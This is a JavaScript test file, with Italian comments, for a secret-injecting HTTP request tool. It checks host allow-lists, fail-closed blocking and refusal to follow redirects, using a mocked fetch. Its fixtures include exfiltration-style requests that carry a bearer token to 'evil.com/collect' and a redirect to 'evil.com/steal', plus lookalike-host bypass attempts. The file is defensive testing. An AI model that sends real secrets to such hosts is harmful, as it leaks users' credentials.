/**
 * Test del canale TIPIZZATO http_request (ADR 2026-06-30, arch H2): checkSinkTyped + injectTypedRequest (sealed-secrets)
 * + executeHttpRequest (http-request.mjs) con un `fetch` FINTO (no rete reale). Asserzioni Reddit-grade:
 *   [A] secret bloccato → fetch NON chiamato, valore NON sostituito (fail-closed).
 *   [B] secret consentito → il VALORE REALE raggiunge il sink (fetch) e il {{secret}} sparisce.
 *   [C] redirect 3xx → NON seguito (un token non rimbalza su un altro host).
 */
import { setSecret, clearSealed, checkSinkTyped, injectTypedRequest } from "../../src/sealed-secrets.mjs";
import { clearSecrets } from "../../src/secrets-registry.mjs";
import { executeHttpRequest } from "../../src/http-request.mjs";

let passed = 0, failed = 0;
function ok(cond, msg) { if (cond) { passed++; } else { failed++; console.error("  ✗ FAIL:", msg); } }
const reset = () => { clearSealed(); clearSecrets(); };

/** fetch FINTO: registra le chiamate, risponde con uno scripted (status/headers/body) o lancia. */
function fakeFetch({ status = 200, headers = {}, body = "OK", throwErr = null } = {}) {
  const calls = [];
  const fn = async (url, init) => {
    calls.push({ url, init });
    if (throwErr) throw throwErr;
    return {
      status,
      headers: { get: (k) => headers[String(k).toLowerCase()] ?? null },
      async text() { return body; },
    };
  };
  fn.calls = calls;
  return fn;
}

// ── checkSinkTyped ────────────────────────────────────────────────────────────────────────────────
{
  reset();
  setSecret("TKN", "sk-REALVALUE-aaaa", { allowedSinks: ["api.x.com"] });
  ok(checkSinkTyped("TKN", "https://api.x.com/v1").allowed, "TYPED: https host in allowedSinks → allowed");
  ok(!checkSinkTyped("TKN", "https://evil.com/v1").allowed, "TYPED: https host estraneo → blocked");
  ok(!checkSinkTyped("NOPE", "https://api.x.com").allowed, "TYPED: secret inesistente → blocked");
  ok(!checkSinkTyped("TKN", "ftp://api.x.com").allowed, "TYPED: schema non http/https → blocked");
  ok(!checkSinkTyped("TKN", "not a url").allowed, "TYPED: URL invalido → blocked");
  ok(!checkSinkTyped("TKN", "http://evil.com").allowed, "TYPED: http verso host esterno → blocked");
  ok(!checkSinkTyped("TKN", "http://localhost:3000").allowed, "TYPED: http://localhost senza allowLocalHttp → blocked");
}
{
  reset();
  setSecret("SUB", "sk-REALVALUE-bbbb", { allowedSinks: ["x.com"] });
  ok(checkSinkTyped("SUB", "https://api.x.com/v1").allowed, "TYPED: suffix-domain (api.x.com ⊆ x.com) → allowed");
  ok(checkSinkTyped("SUB", "https://x.com").allowed, "TYPED: host esatto = allow → allowed");
  ok(!checkSinkTyped("SUB", "https://notx.com").allowed, "TYPED: suffix NON valido (notx.com) → blocked");
}
{
  reset();
  setSecret("LJ", "sk-REALVALUE-cccc", { allowedSinks: [], allowLocalHttp: true });
  ok(checkSinkTyped("LJ", "http://localhost:3000/x").allowed, "TYPED: http://localhost + allowLocalHttp → allowed");
  ok(checkSinkTyped("LJ", "http://127.0.0.1:8080").allowed, "TYPED: http://127.0.0.1 + flag → allowed");
  ok(checkSinkTyped("LJ", "http://[::1]:3000").allowed, "TYPED: http://[::1] IPv6 loopback + flag → allowed (più capace del bash)");
  ok(!checkSinkTyped("LJ", "http://127.0.0.1.evil.com").allowed, "TYPED: 127.0.0.1.evil.com NON loopback → blocked");
  ok(!checkSinkTyped("LJ", "http://evil.com").allowed, "TYPED: flag NON apre http esterno → blocked");
}
{
  reset();
  setSecret("NS", "sk-REALVALUE-dddd", { allowedSinks: [] });
  ok(!checkSinkTyped("NS", "https://api.x.com").allowed, "TYPED: senza allowedSinks (strict) → blocked");
  ok(checkSinkTyped("NS", "https://api.x.com", "warn").allowed, "TYPED: senza allowedSinks (warn) → allowed+warn");
  ok(checkSinkTyped("NS", "https://api.x.com", "off").allowed, "TYPED: mode off → allowed");
}

// ── injectTypedRequest (fail-closed) ────────────────────────────────────────────────────────────
{
  reset();
  setSecret("TKN", "sk-REALVALUE-eeee", { allowedSinks: ["api.x.com"] });
  const r = injectTypedRequest({ url: "https://api.x.com/v1", headers: { Authorization: "Bearer {{secret:TKN}}" }, body: "x={{secret:TKN}}" }, "strict");
  ok(r.injected.includes("TKN") && r.blocked.length === 0, "INJECT: ref consentito → injected");
  ok(r.headers.Authorization === "Bearer sk-REALVALUE-eeee", "INJECT: header sostituito col valore reale");
  ok(r.body === "x=sk-REALVALUE-eeee", "INJECT: body sostituito");
  ok(r.url === "https://api.x.com/v1", "INJECT: url senza ref resta invariato");
}
{
  reset();
  setSecret("TKN", "sk-REALVALUE-ffff", { allowedSinks: ["api.x.com"] });
  const r = injectTypedRequest({ url: "https://evil.com/v1", headers: { Authorization: "Bearer {{secret:TKN}}" } }, "strict");
  ok(r.blocked.length === 1 && r.injected.length === 0, "INJECT: host estraneo → blocked, niente injection");
  ok(r.url === undefined && (!r.headers || r.headers === undefined), "INJECT fail-closed: nessuna stringa risolta restituita");
  ok(JSON.stringify(r).indexOf("sk-REALVALUE-ffff") === -1, "INJECT fail-closed: il VALORE non appare da nessuna parte");
}
{
  reset();
  const r = injectTypedRequest({ url: "https://api.x.com", headers: { X: "{{secret:GHOST}}" } }, "strict");
  ok(r.blocked.length === 1 && r.blocked[0].reason.includes("does not exist"), "INJECT: secret inesistente → blocked");
}

// ── executeHttpRequest: [B] il valore reale raggiunge il sink ─────────────────────────────────────
{
  reset();
  setSecret("TKN", "sk-REALVALUE-1111", { allowedSinks: ["api.x.com"] });
  const f = fakeFetch({ status: 200, headers: { "content-type": "application/json" }, body: '{"ok":true}' });
  const r = await executeHttpRequest({ url: "https://api.x.com/v1", method: "POST", headers: { Authorization: "Bearer {{secret:TKN}}" }, body: "ping" }, { fetchImpl: f, mode: "strict" });
  ok(r.ok && r.status === 200, "EXEC: richiesta consentita → ok, status 200");
  ok(f.calls.length === 1, "EXEC: fetch chiamato una volta");
  ok(f.calls[0].init.headers.Authorization === "Bearer sk-REALVALUE-1111", "[B] EXEC: il VALORE REALE è arrivato al sink (header)");
  ok(f.calls[0].init.redirect === "manual", "EXEC: redirect:'manual' impostato (anti exfil-via-redirect)");
  ok(r.injected.includes("TKN"), "EXEC: injected riporta TKN");
  ok(r.headers["content-type"] === "application/json", "EXEC: header risposta (allow-list) riportato");
}

// ── executeHttpRequest: [A] bloccato → fetch NON chiamato, valore non esce ────────────────────────
{
  reset();
  setSecret("TKN", "sk-REALVALUE-2222", { allowedSinks: ["api.x.com"] });
  const f = fakeFetch();
  const r = await executeHttpRequest({ url: "https://evil.com/collect", headers: { Authorization: "Bearer {{secret:TKN}}" } }, { fetchImpl: f, mode: "strict" });
  ok(!r.ok && r.blocked && r.blocked.length === 1, "[A] EXEC bloccato: ok:false + blocked");
  ok(f.calls.length === 0, "[A] EXEC bloccato: fetch NON chiamato (fail-closed)");
  ok(JSON.stringify(r).indexOf("sk-REALVALUE-2222") === -1, "[A] EXEC bloccato: il valore NON appare nel risultato");
}

// ── executeHttpRequest: [C] redirect 3xx NON seguito ─────────────────────────────────────────────
{
  reset();
  setSecret("TKN", "sk-REALVALUE-3333", { allowedSinks: ["api.x.com"] });
  const f = fakeFetch({ status: 302, headers: { location: "https://evil.com/steal?code=SECRET123" }, body: "" });
  const r = await executeHttpRequest({ url: "https://api.x.com/go", headers: { Authorization: "Bearer {{secret:TKN}}" } }, { fetchImpl: f, mode: "strict" });
  ok(r.ok && r.redirected === true && r.location === "https://evil.com", "[C] EXEC redirect: riportato, non seguito, Location ridotto a scheme+host");
  ok(!/steal|SECRET123/.test(JSON.stringify(r)), "[C] EXEC redirect: query/path del Location NON riflessi (anti redactEgress:false reflection)");
  ok(f.calls.length === 1, "[C] EXEC redirect: fetch chiamato UNA sola volta (non ha seguito il 302)");
  ok(/not followed/i.test(r.note || ""), "[C] EXEC redirect: nota di sicurezza presente");
}

// ── executeHttpRequest: validazioni / edge ────────────────────────────────────────────────────────
{
  reset();
  const f = fakeFetch();
  ok(!(await executeHttpRequest({ url: "https://api.x.com", method: "TRACE" }, { fetchImpl: f })).ok && f.calls.length === 0, "EXEC: metodo non ammesso → ok:false, no fetch");
  ok(!(await executeHttpRequest({ url: "not a url" }, { fetchImpl: f })).ok, "EXEC: URL invalido → ok:false");
  ok(!(await executeHttpRequest({ url: "ftp://x.com" }, { fetchImpl: f })).ok, "EXEC: schema non http/https → ok:false");
  ok(!(await executeHttpRequest({ url: "" }, { fetchImpl: f })).ok, "EXEC: url vuoto → ok:false");
  // NB: il guard 'no fetch impl' (fetchImpl non-funzione) esiste per ambienti senza global fetch; non testabile in modo
  // pulito qui (Node 22+ ha globalThis.fetch, su cui l'executor ripiega di proposito) → non lo si forza con undefined.
}
{
  reset();
  // GET con body → il body NON deve essere inviato
  const f = fakeFetch();
  await executeHttpRequest({ url: "https://x.com", method: "GET", body: "should-not-send" }, { fetchImpl: f, mode: "off" });
  ok(f.calls[0].init.body === undefined, "EXEC: GET non invia body");
}
{
  reset();
  // body di risposta CAP-ato
  const f = fakeFetch({ status: 200, body: "X".repeat(500) });
  const r = await executeHttpRequest({ url: "https://x.com" }, { fetchImpl: f, mode: "off", maxBytes: 100 });
  ok(r.truncated === true && r.body.length === 100, "EXEC: body risposta CAP-ato a maxBytes");
}
{
  reset();
  // fetch lancia → ok:false con errore
  const f = fakeFetch({ throwErr: new Error("ECONNREFUSED") });
  const r = await executeHttpRequest({ url: "https://x.com" }, { fetchImpl: f, mode: "off" });
  ok(!r.ok && /ECONNREFUSED|failed/i.test(r.error), "EXEC: fetch lancia → ok:false + error");
}

reset();
console.log(`http-request test: ${passed} passed, ${failed} failed`);
process.exit(failed ? 1 : 0);
